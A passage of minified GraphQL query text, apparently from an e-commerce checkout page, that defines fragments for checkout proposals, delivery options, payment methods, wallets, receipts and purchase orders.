__typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentInstrumentAccessorId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on 